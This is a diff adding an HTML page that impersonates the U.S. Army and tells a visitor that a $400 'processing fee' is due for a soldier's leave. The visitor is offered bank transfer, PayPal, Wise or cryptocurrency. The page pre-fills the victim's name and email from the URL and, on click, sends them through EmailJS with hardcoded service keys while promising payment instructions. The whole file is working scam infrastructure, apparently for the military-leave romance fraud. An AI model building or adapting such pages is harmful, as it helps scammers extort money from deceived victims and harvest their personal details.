@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>U.S. Army Leave – Payment Processing</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #f5f5f5;
+      margin: 0;
+      padding: 40px 15px;
+    }
+    .container {
+      max-width: 600px;
+      background: white;
+      padding: 40px;
+      margin: auto;
+      border-radius: 14px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
+      text-align: center;
+    }
+    .logo {
+      width: 90px;
+      margin-bottom: 25px;
+    }
+    h2 {
+      margin: 10px 0 15px;
+      font-size: 22px;
+    }
+    p {
+      color: #333;
+      font-size: 15px;
+      line-height: 1.6;
+    }
+    .payment-options {
+      margin-top: 25px;
+    }
+    .payment-options button {
+      width: 100%;
+      background: #ffffff;
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      padding: 14px 20px;
+      font-size: 15px;
+      display: flex;
+      align-items: center;
+      justify-content: flex-start;
+      margin: 10px 0;
+      cursor: pointer;
+    }
+    .payment-options img {
+      width: 26px;
+      margin-right: 12px;
+    }
+    .thank-you {
+      display: none;
+      margin-top: 30px;
+      padding: 18px;
+      border-radius: 10px;
+      background: #e7f8e7;
+      color: #2a662a;
+      font-size: 15px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://i.imgur.com/y4DFFMe.png" class="logo" alt="U.S. Army Logo" />
+    
+    <h2>Leave Application – Processing Fee</h2>
+    <p>Dear <span id="displayName">Applicant</span>,</p>
+    <p>To proceed with your leave request, a one-time processing fee of <strong>$400</strong> is required.</p>
+    <p>Please select your preferred payment method below. Instructions will be sent to your email immediately.</p>
+
+    <form id="paymentForm">
+      <!-- Hidden fields -->
+      <input type="hidden" id="full_name" name="full_name" />
+      <input type="hidden" id="email" name="email" />
+      <input type="hidden" id="payment_method" name="payment_method" />
+
+      <div class="payment-options">
+        <button type="button" onclick="submitPayment('Bank Transfer')">
+          <img src="https://cdn-icons-png.flaticon.com/512/1006/1006555.png" alt="Bank" /> Bank Transfer
+        </button>
+        <button type="button" onclick="submitPayment('PayPal')">
+          <img src="https://cdn-icons-png.flaticon.com/512/888/888870.png" alt="PayPal" /> PayPal
+        </button>
+        <button type="button" onclick="submitPayment('Wise')">
+          <img src="https://seeklogo.com/images/W/wise-logo-5364E252C6-seeklogo.com.png" alt="Wise" /> Wise (TransferWise)
+        </button>
+        <button type="button" onclick="submitPayment('Cryptocurrency')">
+          <img src="https://cdn-icons-png.flaticon.com/512/825/825500.png" alt="Crypto" /> Cryptocurrency
+        </button>
+      </div>
+    </form>
+
+    <div class="thank-you" id="thankYouMessage"></div>
+  </div>
+
+  <script>
+    (function(){
+      // === PLACE YOUR EmailJS PUBLIC KEY BELOW ===
+      emailjs.init("JWcOE8k4MMUEFNPy-");
+
+      const urlParams = new URLSearchParams(window.location.search);
+      const name = urlParams.get('name') || 'Applicant';
+      const email = urlParams.get('email') || '';
+
+      document.getElementById('displayName').textContent = name;
+      document.getElementById('full_name').value = name;
+      document.getElementById('email').value = email;
+    })();
+
+    function submitPayment(method) {
+      document.getElementById("payment_method").value = method;
+
+      // === PLACE YOUR EmailJS SERVICE & TEMPLATE IDs BELOW ===
+      emailjs.send("service_96jc01n", "template_uikbtgh", {
+        full_name: document.getElementById("full_name").value,
+        email: document.getElementById("email").value,
+        payment_method: method
+      })
+      .then(() => {
+        document.querySelector(".payment-options").style.display = "none";
+        document.getElementById("thankYouMessage").style.display = "block";
+        document.getElementById("thankYouMessage").innerText = 
+          `Thank you. Secure instructions for ${method} will be sent to your email shortly.`;
+      })
+      .catch((error) => {
+        alert("Error sending instructions. Please try again.");
+        console.error("EmailJS Error:", error);
+      });
+    }
+  </script>
+</body>
+</html>
